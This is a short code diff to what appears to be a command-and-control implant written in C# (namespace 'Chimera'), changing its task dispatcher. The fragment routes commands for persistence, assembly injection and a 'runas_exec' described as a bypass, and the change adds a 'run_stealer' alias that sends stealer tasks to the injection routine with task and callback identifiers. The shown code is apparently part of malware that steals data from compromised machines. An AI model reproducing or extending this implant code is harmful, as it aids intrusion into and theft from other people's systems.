@@ -76,8 +76,9 @@ namespace Chimera
                             : Commands.Persist.Execute();
                         break;
                     case "inject_assembly":
-                        output = Commands.InjectAssembly.Execute(parameters);
-                        break;
+                    case "run_stealer":   // alias
+                        output = Commands.InjectAssembly.Execute(parameters, taskID, CallbackUUID);
+                           break;
                     case "runas_exec":
                         // Old, now serves as bypass command
                         output = Commands.RunasExec.Execute(parameters);
